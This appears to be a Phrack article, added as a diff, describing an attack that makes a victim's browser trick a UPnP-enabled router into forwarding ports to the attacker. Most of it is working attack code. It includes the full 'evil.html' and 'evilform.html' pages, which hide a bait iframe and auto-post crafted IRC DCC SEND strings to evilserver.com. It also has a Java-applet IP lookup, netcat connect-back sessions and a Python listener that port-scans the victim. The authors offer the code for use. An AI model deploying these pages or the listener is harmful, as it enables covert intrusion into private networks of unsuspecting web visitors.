@@ -1,0 +1,802 @@
+                             ==Phrack Inc.==
+
+               Volume 0x0c, Issue 0x41, Phile #0x05 of 0x0f
+
+|=-----------------=[ Clawing holes in NAT with UPnP ]=------------------=|
+|=-----------------------------------------------------------------------=|
+|=---=[ max_packetz@felinemenace.org <http://www.felinemenace.org> ]=----=|
+|=--------------------------=[ April 12th 2008 ]-=-----------------------=|
+
+--[ Contents
+
+  1 - Introduction / An overview of NAT and UPnP.
+
+  2 - Implementation Details
+   2.1 - Implementation specifics: IRC Protocol: DCC 
+   2.2 - Implementation specifics: Java
+   2.3 - Implementation specifics: HTML
+   2.4 - Implementation specifics: Listener
+
+  3 - Putting it all together with Python
+
+  4 - References
+
+  5 - Appendix A: Source code
+
+
+--[ 1 - Introduction / An overview of NAT and UPnP.
+
+Welcome reader, this paper is a short attempt at documenting a 
+practical technique we have been working on. Although our technique 
+uses very similar technology to many other attacks, we have not 
+seen this documented in such a manner before, nor have we seen a 
+practical implementation in the wild. This paper is therefore designed 
+to accommodate this.
+
+Our technique allows the attacker (us) to craft a website which, 
+when visited, will cause the victim to inadvertently forward any port 
+of our choice through their NAT, allowing us to connect directly to them 
+inside their private network via UPnP.
+
+Before we launch into the specifics of the technique, or our 
+implementation details, you must first be familiar with a couple of 
+fairly straight forward concepts. These are: "Network Address 
+Translation" (NAT) and "Universal Plug and Play" (UPnP).
+
+Hopefully most people reading this paper are already familiar with 
+NAT. For those who arn't, NAT basically allows several machines 
+to share a single IP address without conflict. This means that a single 
+computer or router acts as a gateway for several other computers. To 
+learn more about the specifics of NAT read the RFC in the references 
+section [1].
+
+For a typical home user, NAT is implemented by their DSL modem/router
+and is fairly seamless. The internal IP address is assigned by a DHCP
+service on the router and internal users are almost never aware of 
+their external address.
+
+It is a common misconception that NAT provides an impenetrable
+security layer for the internal hosts. Often this leads to a 
+more lapse security policy for internal machines, and a nice 
+gaping hole for anyone who manages to penetrate the outer shell.  
+It is very common to find publicly accessible smb shares or poorly 
+patched services etc. using our technique.
+
+The other concept which you must be familiar with before we 
+can get into the (hopefully) interesting section of this paper
+is "Universal Plug and Play ", UPnP. 
+
+Universal Plug and Play (UPnP) is a set of protocols which were 
+consolidated by the UPnP forum. The general theme which all these 
+protocols have in common is that they allow for seamless implementation 
+of networks and data communication.
+
+The major feature of this protocol suite which is of interest to us in 
+the context of this paper is the NAT punching functionality.
+
+This feature describes how a gateway can parse various protocols 
+passing through it in order to forward ports through the NAT to the 
+internal service. It is designed in order to allow any host behind the 
+NAT to request that a port be opened up in the outer layer, and any 
+traffic received on this port will be forwarded through to the internal
+machine, creating new channel for communications.  This functionality
+allows protocols such as FTP/SIP/etc to function.  In these cases the 
+gateway responsible for NAT will parse the protocol stream looking for 
+requests for a separate channel to be created. It will then search and
+replace the IP and port values as they pass over the wire, replacing 
+them with the external values.  Thus, the other end of the transaction
+knows to try to connect to the external IP address and port, rather 
+than the internal values.
+
+It is very common currently for most household ADSL/modems and routers 
+to ship with UPnP enabled by default. Also the Linux kernel supports 
+UPnP with ipfilter, however this isn't a default config option and
+only really active when using a Linux box as a gateway device.
+
+It's this feature that we are able to exploit in order to create the 
+forwarding of our choice, allowing us access any specific port on a 
+host behind the NAT directly, regardless of the fact the NAT is there.
+
+--[ 2 - Implementation Specifics
+
+In this chapter we will try to provide a detailed overview of our 
+technique itself and discuss our implementation details. We will 
+try to explain the criteria for selecting each of the protocols and 
+technologies we used for implementing each component of our technique.
+
+For those of you familiar with the technologies associated with our 
+implementation, the overview below should be enough for you to implement 
+our technique by yourself.  However we would like to note that our 
+technique can be implemented in other ways, and our implementation 
+serves as just one example. We will only discuss the various technologies 
+used by felinemenace throughout the rest of this paper.
+
+The basic premis of our technique is to encapsulate one protocol 
+(specifically one of the protocols which are handled by UPnP NAT 
+Punching functionality) within a second, transport protocol. This way 
+when the gateway see's the traffic it will interpret the encapsulated 
+protocol string as a request to open a port, and act accordingly.
+
+Our implementation begins by convincing the victim to visit a website 
+of our choice. This can be accomplished via social engineering, cross 
+site scripting, phishing, baiting, banner ads, etc. Once the victim 
+has accessed our site, we have enough control over their browser in 
+order to redirect it to any port of our choice, on any address. This 
+flexibility allows us to accomodate almost any choice of protocol to 
+be encapsulated within the web session. The aformentioned behaviour 
+makes (in the author's opinion) the use of HTML/Javascript, as a 
+delivery mechanism, to be a very effective choice. 
+
+When the victim accesses the website a fake (bait) web site is displayed 
+to them. This is done so as not to encourage the user to immediately close
+the page upon load.
+
+From this stage the attacker uses one of the various methods of 
+browser redirection, HTTP response, javascript redirection etc. in
+order to redirect the victim's browser to a port of the attacker's 
+choice. We chose JavaScript since a large portion of the technique was
+already written in JavaScript. This is documented in the HTML section
+of the paper.
+
+The attacker chooses a port which corresponds to a particular protocol
+that performs a data transfer out of band with the initial communication. 
+In our case we chose the DCC feature from the IRC protocol. [3] Our reason
+for choosing this protocol was simply because we were already familiar 
+with it however, any protocol which fits this criteria is fine. The 
+attacker then (using the JavaScript running on the victims computer at 
+this stage) forces the victim to send text from the appropriate 
+protocol, (DCC in our case) back to the attacker. If the gateway 
+device responsible for NAT has UPnP features enabled, this will cause 
+the device to open up a hole (as mentioned previously) and grant the 
+attacker direct access to the local machine behind the NAT.
+
+By redirecting multiple times, an attacker is able to open up a range
+of ports, to portscan the host, or connect to any service running
+on the local machine.
+
+We have provided an implementation of this for you to use, however 
+obviously writing your own will make it less detectable / more useful.
+
+Now that we've looked at the technique from a high level breakdown we 
+will dive deeper into each of the technologies which come together to 
+make our technique work.
+
+To summarize this section, the following technologies will be covered
+by this paper:
+
+o IRC Protocol: DCC
+o A Java Applet.
+o HTML with JavaScript.
+o Python code to ./scriptkiddify the whole process up.
+
+The rest of this chapter has been broken down into a walkthru of the 
+in's and out's of each of the technologies mentioned, and how we can 
+manipulate them to our desired end.
+
+Each of the following sections will describe a single technology, and how
+we used it.
+
+--[ 2.1 - Implementation specifics: IRC Protocol: DCC
+
+The first step in our implementation is to find a protocol which requires
+a separate socket connection in order to communicate directly with 
+an end user. 
+
+While, as mentioned previously, there exist a multitude of protocols 
+which fit our criteria, for the sake of this paper we will demonstrate
+one in particular, RFC-1459 [3] Internet Relay Chat.
+
+While i'm sure that most people reading this paper are already 
+intimately familiar with IRC, i will give a brief rundown on the aspects 
+of the protocol which are interesting in the scope of this paper.
+
+Basically IRC requires that each client connects to a central server,
+typically on port 6667. When one client wishes to send a message to another
+they send a message to the server using the existing socket connection they
+have open. The server then forwards this message on to the target client.
+
+If two of the users on an IRC server wish to communicate without having the
+server be responsible for passing the message between them, (read; trade
+top secret 0day juarez) they can establish a separate communication 
+channel. This is accomplished by using a subset of the IRC protocol known 
+as DCC (Direct Client to Client).
+
+DCC works by one client sending a request to establish an out of band
+connection with another client on the IRC server. This request contains 
+both the IP and port on which the communication will take place. The 
+second client then simply establishes a TCP connection with these 
+details, and uses it for further communication. 
+
+What this basically boils down to is the following line.
+
+"\x01DCC SEND fake.exe 2130706433 1337\x01\r\n\r\n"
+
+This is the format of a DCC SEND command. As you can see the entire 
+command is enclosed within "\x01" characters. It contains the words
+"DCC SEND" followed by the name of the file which is going to be sent.
+After this is the internal IP address of the requesting host, in numeric
+decimal format, and finally the port the transaction will take place on.
+The format of the IP address is explained more thoroughly by optiklenz in 
+Keen Veracity 6 [5].
+
+This aspect of the protocol clearly will not work under a typical NAT 
+environment (without UPnP enabled).  After receiving the IP address and 
+port information, the connecting host would end up trying to connect to a 
+local address (the address of the machine inside the NAT), and
+never actually make it back to the intended recipient. It is for this 
+reason that a UPnP enabled gateway must parse IRC traffic looking for 
+DCC style commands. When this is detected, the gateway will replace 
+the IP address in the request, with it's own address. When the 
+connection is received on the port specified, the gateway will forward 
+it inside the NAT to the originating host. It is this behaviour that, 
+as the attacker, we can exploit for our own benefit.
+
+If, as the attacker, we force the victim to send a crafted DCC SEND request
+(such as the one above) to port 6667 there's a good chance that the 
+gateway will open up the port specified in the request, providing UPnP is 
+enabled. The cool thing about this protocol is that no IP address is 
+specified for the connecting IP. This means that once the request has 
+taken place, a connection from anywhere in the world is completely valid. 
+
+Several implementations of UPnP do not even care if the IP address 
+specified in the DCC SEND command is the same as that of the victim 
+machine. In this case, the steps described so far are sufficient to open a 
+gaping hole in the gateway and connect to the victim. However in most 
+cases we need to first establish the internal IP address of the victim's 
+machine.
+
+Luckily there is an easy way to accomplish this from the web, which we 
+will address in the next section.
+
+--[ 2.2 - Implementation specifics - Java
+
+The easiest way to identify the local IP of the victim from the web is
+to use a Java applet. Applets are able to create a new Socket object and 
+call the "getLocalAddress()" method on it to obtain the local address of 
+the host (obviously).
+
+The following Java code illustrates this: 
+
+String s = (new Socket(s2, i)).getLocalAddress().getHostAddress();
+
+Luckily for us, there already exists a nicely pre-packaged Java applet 
+called MyAddress [4] which does this and can be downloaded straight from 
+their website.  
+
+The applet supports a variety of ways to access the local
+IP once it is obtained. One way is to specify the "mayscript" parameter
+in the applet tag; this causes a javascript function (MyAddress() by 
+default) to be called once the IP is obtained.  This is useful, as we can 
+effectively block until we receive this neccessary data.
+
+The following HTML demonstrates the use of this applet and the MyAddress()
+callback function.  Also (as mentioned earlier in the DCC protocol section)
+as the local IP address must be entered in "defunct" format, we've 
+provided the defunct() function to translate from decimal format to 
+defunct:
+
+	<applet code="MyAddress.class" name="myaddress" 
+	 mayscript width="0" height="0"></applet>
+	<script>
+	<!--
+		var ip = null;
+		function MyAddress(i) {ip = defunct(i); doevil();}
+		function defunct(sip) {
+			if(sip == null) return 0;
+			sip += '';  // ;( make sure it's a string
+
+			var dip = 0;
+			var a = sip.split(".");
+			var l = a.length;
+			for(var i=0; i<l; i++) 
+				dip += a[l-i-1]*Math.pow(256,i);
+			return dip;
+		}
+	-->
+	</script>
+
+--[ 2.3 - Implementation specifics: HTML
+
+Now that we can create a proper DCC send string, the next problem 
+to overcome is how to force the client to unknowingly send the 
+encapsulated string to a malicious server, thereby tricking their
+gateway into forwarding a port we specify.  HTML forms submitted 
+automatically via javascript are highly useful for this.
+
+Since the DCC string (and many other protocols you might choose
+to use with this technique) require multiple lines of communication
+to trigger the UPnP NAT traversal features, we set the "enctype" 
+attribute to "multipart/form-data".  This allows the required 
+carriage return and new line characters to be submitted via a 
+form field.
+
+The following form tag shows how to specify the enctype:
+
+	<form 	
+		id="evilform" 
+		name="evilform" 
+		action="http://evilserver.com:6667/"
+		method="post" 
+		enctype="multipart/form-data"
+	>
+
+In order to automate the submission of our DCC string (payload), 
+we use javascript to submit the form (after the internal IP address
+is obtained) via the form submit() method as follows:
+
+	function doevil(ip, port) {
+		var frm = document.forms['evilform'];
+		if(frm == null) return;
+		frm.payload.value = unescape("%01")
+			+ "DCC SEND evil.txt " + ip + " " + port + 
+			+ unescape("%01%0a%0d");
+		try { frm.submit(); } catch(err) { return; }
+	}
+	
+As you can see we've used javascript to craft the payload string,
+because of the neccessary (depending of gateway implementation) 
+carriage return and newline characters.
+
+The following HTML code demonstrates the code so far, including
+the use of the MyAddress applet mentioned in the previous section:
+
+	<html>
+	<head>
+	<title>(Untitled)</title>
+	<applet code="MyAddress.class" name="myaddress" 
+	        mayscript width="0" height="0"></applet>
+	<script>
+	<!--
+		var port = 1337;
+		function MyAddress(i) {ip = defunct(i); doevil(ip, port);}
+		function defunct(sip) {
+			if(sip == null) return 0;
+			sip += '';  // ;( make sure it's a string
+
+			var dip = 0;
+			var a = sip.split(".");
+			var l = a.length;
+			for(var i=0; i<l; i++) 
+				dip += a[l-i-1]*Math.pow(256,i);
+			return dip;
+		}
+		function doevil(ip, port) {
+			var frm = document.forms['evilform'];
+			if(frm == null) return;
+			frm.payload.value = unescape("%01")
+				+ "DCC SEND evil.txt " + ip + " " + port + 
+				+ unescape("%01%0a%0d");
+			try { frm.submit(); } catch(err) { return; }
+		}
+	-->
+	</script>
+	</head>
+	<body>
+	<form 	
+		id="evilform" 
+		name="evilform" 
+		action="http://evilserver.com:6667/"
+		method="post" 
+		enctype="multipart/form-data"
+	>
+	<input type="input" id="payload" 
+	 name="payload" value="null">
+	</form>
+	</body>
+	</html>
+
+By simply binding netcat to port 6667 of evilserver.com, this 
+code is enough to manually connect back to the port "port" once
+a victim has viewed this web page, as the following snippet 
+demonstrates:
+
+-[max@evilserver:~/simple]$ nc -lp 6667
+POST / HTTP/1.1
+Host: evilserver.com:6667
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.13) 
+Gecko/20080311 Firefox/2.0.0.13
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,
+text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://evilserver.com/simpletest.html
+Content-Type: multipart/form-data; boundary=---------------------------
+162151946613101846322123277333
+Content-Length: 213
+
+-----------------------------162151946613101846322123277333
+Content-Disposition: form-data; name="payload"
+
+DCC SEND evil.txt 16909060 1337NaN
+-----------------------------162151946613101846322123277333--
+
+You can see that a victim has connected to our webpage (simpletest.html)
+and that the page has automatically submitted our DCC SEND send string.
+Using netcat again, we can connect back to the ip and port above (using 
+the defunct format works fine with nc):
+
+-[max@evilserver:~/simple]$ nc 16909060 1337
+muahahaha
+what are you doing here?!  
+
+Here's what it looks like from the victim's end:
+
+-[victim@QQ:~]$ nc -lp 1337
+muahahaha
+what are you doing here?!  
+
+Obviously there are some significant drawbacks to using this
+simplified example...who wants to sit and manually monitor 
+their connections and then manually connect back to victims?
+What if you want to connect to multiple ports?  Won't it kinda
+tip the victim off (or at least bore them mightily) if there's 
+nothing but a dodgy page for them to look at?  How about something
+interesting?  Like maybe an article....
+
+The topic of the listening and connect back mechanism is addressed
+in the next section of this chapter.  The content problem and the 
+ability to forward multiple ports per visit are addressed by creating
+an additional page (evil.html) that contains two HTML iframes, one hidden 
+and one visible.  While the victim is distracted by content in the 
+visible iframe (goodframe), the hidden iframe (evilframe) 
+loads the second page (evilform.html) in order to post (as many times 
+as desired) to evilserver.
+
+The code might look something like this (note that we keep the 
+MyAddress code in evil.html; there's no sense in loading it multiple
+times):
+
+evil.html:
+
+	<html>
+	<head>
+	<title>(Untitled)</title>
+	<applet code="MyAddress.class" name="myaddress" 
+	        mayscript width="0" height="0"></applet>
+	<script type="text/javascript">
+	<!--
+		var ports = [135,137,138,139,22,1337];
+		var port = null;
+		var ip = null;
+
+		function MyAddress(i) {ip = defunct(i); openports();}
+		function defunct(sip) {
+			if(sip == null) return 0;
+			sip += '';  // ;( make sure it's a string
+
+			var dip = 0;
+			var a = sip.split(".");
+			var l = a.length;
+			for(var i=0; i<l; i++) 
+				dip += a[l-i-1]*Math.pow(256,i);
+			return dip;
+		}
+		function openports() {
+			if(!ports || !ip) return;
+			for(port in ports) 
+				document.getElementById('evilframe').src = 'evilform.html'; 
+		}
+	-->
+	</script>
+	</head>
+	<body style="padding: 0px; border:none; margin:0px;">
+	<iframe name="evilframe" id="evilframe" src="" 
+	        width="0" height="0" frameborder="0"></iframe>
+	<iframe name="goodframe" id="goodframe" 
+	       src="http://google.com" width="100%" height="100%"
+	       frameborder="0">
+        </iframe>
+	</body>
+	</html>
+
+Upon load, evilform.html will access evil.html's (its parent's) variables
+"port" and "ip" to craft the payload DCC string and then post:
+
+evilform.html:
+
+	<html>
+	<head>
+	<title>(Untitled)</title>
+	</head>
+	<script>
+	<!--
+		function doevil(ip, port) {
+			var frm = document.forms['evilform'];
+			if(ip == null || port == null || frm == null) return;
+			frm.internal_ip.value = 'internal_ip:'+ip;
+			frm.internal_port.value = 'internal_port:'+port;
+			frm.payload.value = unescape("%01")
+				+ "DCC SEND evil.txt " + ip + " " + port + 
+				+ unescape("%01%0a%0d");;
+			window.parent.formposting();
+			try { frm.submit(); } catch(err) { return; }
+		}
+	-->
+	</script>
+	<body onload="doevil(window.parent.ip, window.parent.port)">
+	<form 	
+		id="evilform" 
+		name="evilform" 
+		action="http://evilserver.com:6667/"
+		method="post" 
+		enctype="multipart/form-data"
+	>
+	<input type="input" id="payload" name="payload" value="null">
+	<input type="input" id="internal_ip" name="internal_ip" value="null">
+	<input type="input" id="internal_port" name="internal_port" value="null">
+	</form>
+	</body>
+	</html>
+  
+Note that evilform.html is now also setting two additional form variables
+(with some tags to make them easier to regex out later) so that the 
+listener can note what the internal port and IP of the victim are.  Since 
+these variables aren't within a protocol string (like the DCC send string)
+the gateway will not replace them with the external values.
+
+Unfortunately, however,  the code above introduces a race condition: you
+can't be assured that evilform.html has had enough time to load and post 
+before it gets reloaded. We originally expected that this could be 
+remedied if the service listening on 6667 of evilserver.com replied with a 
+page that invoked a callback function in the parent page in the following
+manner:
+
+	<script>window.parent.imdone();</script>
+
+Unfortunately, modern browsers will limit access to data across iframes if 
+the source page's scheme, domain, or port is different.  Because our post
+is neccessarily to a different port (6667 vs 80), the above code will 
+always generate an exception.
+
+Our solution was to mitigate the issue by putting in enough delay after 
+evilform.html begins loading as to be reasonably assured that the page
+has completed it's automatic posting before reloading it. Since javascript
+has no sleep() function (that we could find), we used 
+window.setTimeout(fn, t):
+
+evil.html:
+	...
+		function MyAddress(i) {ip = defunct(i); opennextport();}
+	...
+		function formposting() {
+			window.setTimeout('opennextport()', 1000)
+		}
+		function opennextport() {
+			if(!ports || cp < 0 || cp > ports.length) return;
+			port = ports[cp++];
+			document.getElementById('evilframe').src = 'evilform.html'; 
+		}
+
+	...
+
+evilform.html:
+	...	
+		function doevil(ip, port) {
+			var frm = document.forms['evilform'];
+			if(ip == null || port == null || frm == null) return;
+			frm.internal_ip.value = 'internal_ip:'+ip;
+			frm.internal_port.value = 'internal_port:'+port;
+			frm.payload.value = unescape("%01")
+				+ "DCC SEND evil.txt " + ip + " " + port + 
+				+ unescape("%01%0a%0d");;
+			window.parent.formposting();
+			try { frm.submit(); } catch(err) { return; }
+		}
+	...
+
+One cosmetic issue remains with our code: the title of evil.html will not
+match that of our bait page.  If the bait page is hosted via the same 
+scheme on the same domain and port as evil.html, then this can be easily
+remedied with this code snippet:
+
+	function settitle() { document.title = 
+	window.frames['goodframe'].document.title; }
+	...
+	<body onload="settitle()">
+
+However, as previously mentioned, if the bait page is hosted on a 
+different server or using a different scheme, accessing goodframe's 
+document title would cause an exception to be raised.  In either case, 
+if the victim were to follow an internal link, the title would become 
+outdated.  Our solution was to wrap the assignment in a try / catch block
+and to set a timeout to call settitle again in 350 milliseconds:
+
+		function settitle() {
+			try{ document.title = window.frames['goodframe'].document.title;} 
+			catch(err) {return;}
+			window.setTimeout('settitle()', 350);
+		}
+
+
+Below is the final code:
+
+evil.html:
+
+	<!-- evil.html -->
+	<html>
+	<head>
+	<title>(Untitled)</title>
+	<applet code="MyAddress.class" name="myaddress" 
+	        mayscript width="0" height="0"></applet>
+	<script type="text/javascript">
+	<!--
+		var ip = null;
+		var port = null;
+		var ports = [135,137,138,139,22,1337];
+		var cp = 0;
+
+		function MyAddress(i) {ip = defunct(i); opennextport();}
+		function settitle() {
+			try{ document.title = window.frames['goodframe'].document.title;} 
+			catch(err) {return;}
+			window.setTimeout('settitle()', 350);
+		}
+		function defunct(sip) {
+			if(sip == null) return 0;
+			sip += '';  // ;( make sure it's a string
+
+			var dip = 0;
+			var a = sip.split(".");
+			var l = a.length;
+			for(var i=0; i<l; i++) 
+				dip += a[l-i-1]*Math.pow(256,i);
+			return dip;
+		}
+		function formposting() {
+			window.setTimeout('opennextport()', 1000)
+		}
+		function opennextport() {
+			if(!ports || cp < 0 || cp > ports.length) return;
+			port = ports[cp++];
+			document.getElementById('evilframe').src = 'evilform.html'; 
+		}
+	-->
+	</script>
+	</head>
+	<body onload="settitle()" style="padding: 0px; border:none; margin:0px;">
+	<iframe name="evilframe" id="evilframe" src="" 
+	        width="0" height="0" frameborder="0"></iframe>
+	<iframe name="goodframe" id="goodframe" src="http://google.com" 
+	        width="100%" height="100%" frameborder="0"></iframe>
+	</body>
+	</html>
+
+evilform.html:
+
+	<html>
+	<head>
+	<title>(Untitled)</title>
+	</head>
+	<script>
+	<!--
+		function doevil(ip, port) {
+			var frm = document.forms['evilform'];
+			if(ip == null || port == null || frm == null) return;
+			frm.internal_ip.value = 'internal_ip:'+ip;
+			frm.internal_port.value = 'internal_port:'+port;
+			frm.payload.value = unescape("%01")
+				+ "DCC SEND evil.txt " + ip + " " + port + 
+				+ unescape("%01%0a%0d");;
+			window.parent.formposting();
+			try { frm.submit(); } catch(err) { return; }
+		}
+	-->
+	</script>
+	<body onload="doevil(window.parent.ip, window.parent.port)">
+	<form 	
+		id="evilform" 
+		name="evilform" 
+		action="http://evilserver.com:6667/"
+		method="post" 
+		enctype="multipart/form-data"
+	>
+	<input type="input" id="internal_ip" name="internal_ip" value="null">
+	<input type="input" id="internal_port" name="internal_port" value="null">
+	<input type="input" id="payload" name="payload" value="null">
+	</form>
+	</body>
+	</html>
+
+Voila.  Now you have a couple of pages that can be used 
+to open ports for connecting to boxes that are NAT'd 
+behind UPnP enabled routers. The section below details the 
+final component of our implementation: the listener. 
+
+--[ 2.4 - Implementation specifics: Listener
+
+Possibly the most trivial component of our implementation is
+the listener. This service will sit on evilserver.com and 
+listen on the port of choice (6667 for IRC/DCC and our code
+above).
+
+When the victim browses to evil.html and inadvertantly posts
+via evilform.html, the listener is responsible for receiving 
+the connection. This can trivially be implemented in python 
+using the "SocketServer" module. A small example of this is 
+as follows:
+
+class RequestHandler(SocketServer.StreamRequestHandler):
+	def handle(self):
+		while(True):
+			try:
+				line = self.rfile.readline()
+			except:
+				return
+			...
+
+# begin listening for new connections.
+tcpserver = SocketServer.TCPServer(('localhost', port),RequestHandler)
+tcpserver.serve_forever()
+
+The implementation of the listener provided with this paper will also 
+attempt to connect back to the victim through their gateway, effectively 
+port scanning the victim, behind the NAT.
+
+Here is the code to do this:
+
+	def scan(self, ip, port):
+		sock = socket.socket()
+		sock.settimeout(1)
+
+		ret = sock.connect_ex((ip,int(port))) == 0
+		sock.close()
+		return ret
+
+The code for the listener (whiskers.py) can be generated with the script
+that is included in section Appendix A.
+
+The output of whiskers is as follows:
+
+-[max@evilserver:~]$ python whiskers.py
+
+***********************************************************
+Sat, 12 Apr 2008 01:13:17 GMT: Starting server....
+Sat, 12 Apr 2008 01:13:17 GMT: Server started: 1.2.3.1337 listening on 6667
+Sat, 12 Apr 2008 01:13:39 GMT: [+] Opened hole for port: 135 on ip: 1.2.3.4
+Sat, 12 Apr 2008 01:13:39 GMT: [+] ---- Internal port: 135 on ip: 
+                               192.168.0.100 - closed.
+Sat, 12 Apr 2008 01:13:40 GMT: [+] Opened hole for port: 137 on ip: 1.2.3.4
+Sat, 12 Apr 2008 01:13:40 GMT: [+] ---- Internal port: 137 on ip: 
+                               192.168.0.100 - closed.
+Sat, 12 Apr 2008 01:13:42 GMT: [+] Opened hole for port: 138 on ip: 1.2.3.4
+Sat, 12 Apr 2008 01:13:42 GMT: [+] ---- Internal port: 138 on ip: 
+                               192.168.0.100 - closed.
+Sat, 12 Apr 2008 01:13:43 GMT: [+] Opened hole for port: 139 on ip: 1.2.3.4
+Sat, 12 Apr 2008 01:13:44 GMT: [+] ---- Internal port: 139 on ip: 
+                               192.168.0.100 - closed.
+Sat, 12 Apr 2008 01:13:45 GMT: [+] Opened hole for port: 22 on ip: 1.2.3.4
+Sat, 12 Apr 2008 01:13:45 GMT: [+] ---- Internal port: 22 on ip: 
+                               192.168.0.100 - open.
+Sat, 12 Apr 2008 01:13:53 GMT: Server stopped.
+
+As you can see, the victim had a service running on port 22.
+
+--[ 3 - Putting it all together with Python.
+
+Since it's a bit cumbersome to remember which bit to swivel where and when 
+or what protocol's to use and how, we've provided an extensible python 
+script that generates the two webpages (with the options to name them 
+something a little more innocuous), MyAddress.class,  and a listener based 
+on specified parameters.  
+
+Type ./claw.py -h for usage.
+
+--[ 4 - References
+
+[1] Network Address Translation :: http://www.faqs.org/rfcs/rfc1631.html
+[2] UPnP NAT Traversal
+[3] Khaled would be proud       :: http://www.mirc.co.uk/help/rfc1459.txt
+[4] MyAddress Java Applet       
+                             :: http://reglos.de/myaddress/MyAddress.html
+[5] Defunct IP address representation
+http://www.mirrors.wiretapped.net/security/info/textfiles/keen-veracity/ ..
+  kv6.txt
+
+--[ 5 - Appendix A: Source code 
+
+The source code used in this paper was written by arachne.
+We really appreciate her work on this project.
+
